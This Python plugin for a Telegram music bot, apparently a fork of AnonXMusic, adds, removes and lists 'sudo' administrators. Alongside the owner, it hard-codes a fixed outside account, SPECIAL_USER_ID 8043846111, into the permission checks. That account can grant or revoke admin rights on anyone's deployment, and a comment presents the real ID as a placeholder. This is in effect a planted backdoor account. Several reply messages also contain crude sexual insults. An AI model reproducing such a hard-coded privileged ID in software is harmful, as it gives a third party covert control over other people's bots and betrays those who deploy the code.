from pyrogram import filters
from pyrogram.types import Message

from AnonXMusic import app
from AnonXMusic.misc import SUDOERS
from AnonXMusic.utils.database import add_sudo, remove_sudo
from AnonXMusic.utils.decorators.language import language
from AnonXMusic.utils.extraction import extract_user
from AnonXMusic.utils.inline import close_markup
from config import BANNED_USERS, OWNER_ID

# Define the special user ID
SPECIAL_USER_ID = 8043846111 # Replace with the actual user ID

# Define special users set
SPECIAL_USERS = {SPECIAL_USER_ID}

@app.on_message(filters.command(["addsudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def useradd(client, message: Message, language):
    if not message.reply_to_message and len(message.command) != 2:
        return await message.reply_text("<b>‣ ɪᴛ sᴇᴇᴍs ʟɪᴋᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴍᴇ ᴛᴏ ᴘʀᴏᴠɪᴅᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ᴛᴏ ɢɪᴠᴇ ʏᴏᴜ ᴛʜᴇ ɴᴇxᴛ sᴛᴇᴘ, ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴜsᴇʀ ɪᴅ ᴏʀ ʀᴇᴘʟʏ ᴀ ᴍᴇssᴀɢᴇ.</b>")

    user = await extract_user(message)
    if not user:
        return await message.reply_text("<b>‣ ᴛʜᴇʀᴇ ᴡᴀs ᴀɴ ɪssᴜᴇ ᴇxᴛʀᴀᴄᴛɪɴɢ ᴛʜᴇ ᴜsᴇʀ's ɪɴғᴏʀᴍᴀᴛɪᴏɴ, ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.</b>")

    if user.id in SUDOERS:
        return await message.reply_text(f"<b>‣ {user.mention} ɪs ᴀʟʀᴇᴀᴅʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴀs ᴀ sᴜᴅᴏ ᴜsᴇʀ.</b>")

    added = await add_sudo(user.id)
    if added:
        SUDOERS.add(user.id)
        await message.reply_text(f"<b>‣ {user.mention} ʏᴏᴜ ᴀʀᴇ ɴᴏᴡ ᴀ sᴜᴅᴏ, ᴄʀᴇᴅɪᴛ ɢᴏᴇs ᴛᴏ ʏᴏᴜʀ ᴍᴏᴍ.</b>")
    else:
        await message.reply_text("<b>‣ ᴛʜᴇ ᴀᴛᴛᴇᴍᴘᴛ ᴛᴏ ᴀᴅᴅ ᴛʜᴇ sᴜᴅᴏ ᴜsᴇʀ ᴡᴀs ᴜɴsᴜᴄᴄᴇssғᴜʟ. ᴘʟᴇᴀsᴇ ᴀᴛᴛᴇᴍᴘᴛ ᴀɢᴀɪɴ.</b>")

@app.on_message(filters.command(["delsudo", "rmsudo", "removerand", "removesudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def userdel(client, message: Message, language):
    if not message.reply_to_message and len(message.command) != 2:
        return await message.reply_text("<b>‣ ɪᴛ sᴇᴇᴍs ʟɪᴋᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴍᴇ ᴛᴏ ᴘʀᴏᴠɪᴅᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ᴛᴏ ɢɪᴠᴇ ʏᴏᴜ ᴛʜᴇ ɴᴇxᴛ sᴛᴇᴘ, ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴜsᴇʀ ɪᴅ ᴏʀ ʀᴇᴘʟʏ ᴀ ᴍᴇssᴀɢᴇ.</b>")

    user = await extract_user(message)
    if not user:
        return await message.reply_text("<b>‣ ᴛʜᴇʀᴇ ᴡᴀs ᴀɴ ɪssᴜᴇ ᴇxᴛʀᴀᴄᴛɪɴɢ ᴛʜᴇ ᴜsᴇʀ's ɪɴғᴏʀᴍᴀᴛɪᴏɴ, ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.</b>")

    if user.id not in SUDOERS:
        return await message.reply_text(f"<b>‣ {user.mention} ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪsᴇᴅ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.</b>")

    removed = await remove_sudo(user.id)
    if removed:
        SUDOERS.remove(user.id)
        await message.reply_text(f"<b> {user.mention} sᴏʀʀʏ ᴛᴏ sᴀʏ, ʙᴜᴛ ᴍʏ ʟᴏʀᴅ ᴅɪᴅɴ'ᴛ ʟɪᴋᴇ ʏᴏᴜʀ ᴍᴏᴛʜᴇʀ's ʙʟᴏᴡJᴏʙ  </b>")
    else:
        await message.reply_text("<b>‣ ᴛʜᴇ ᴀᴛᴛᴇᴍᴘᴛ ᴛᴏ ʀᴇᴍᴏᴠᴇ ᴛʜᴇ sᴜᴅᴏ ᴜsᴇʀ ᴡᴀs ᴜɴsᴜᴄᴄᴇssғᴜʟ, ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.</b>")

@app.on_message(filters.command(["sudolist", "sudoers", "specialusers"]) & ~BANNED_USERS)
@language
async def sudoers_list(client, message: Message, language):
    if message.from_user.id != OWNER_ID and message.from_user.id not in SUDOERS:
        return  # Ignore message from non-owner, non-sudoers, and non-special-id

    text = "<b>👑 ᴅɪsᴀsᴛᴇʀs ᴏғ ᴀɴᴏᴛʜᴇʀ ʟᴇᴠᴇʟ..</b>\n\n"
    text += "<b> ʟᴏʀᴅ ᴏғ ʀᴇᴀᴘᴇʀs 🔱</b>\n"
    owner = await app.get_users(OWNER_ID)
    owner = owner.first_name if not hasattr(owner, "mention") else owner.mention
    text += f"神 {owner}\n\n"

    text += "<b>🔱 sᴘᴇᴄɪᴀʟ ᴅɪsᴀsᴛᴇʀs</b>\n"
    try:
        special_user = await app.get_users(SPECIAL_USER_ID)
        special_user = special_user.first_name if not hasattr(special_user, "mention") else special_user.mention
        text += f"‣ {special_user}\n"
    except Exception as e:
        text += "<b>‣ Special user not accessible or doesn't exist.</b>\n"
        print(f"Error fetching SPECIAL_USER_ID: {e}")

    text += "\n<b> sᴏᴜʟ ʀᴇᴀᴘᴇʀs ⚜️</b>\n"
    count = 0
    for user_id in SUDOERS:
        if user_id != OWNER_ID:
            try:
                user = await app.get_users(user_id)
                user = user.first_name if not hasattr(user, "mention") else user.mention
                count += 1
                text += f"» {user}\n"
            except Exception as e:
                print(f"Error fetching user {user_id}: {e}")
                continue

    if count == 0:
        text += "<b>‣ ɴᴏ ᴜsᴇʀs ᴀᴜᴛʜᴏʀɪsᴇᴅ ғᴏʀ ᴇʟᴇᴠᴀᴛᴇᴅ ᴀᴄᴄᴇss.</b>"

    await message.reply_text(text, reply_markup=close_markup(language))
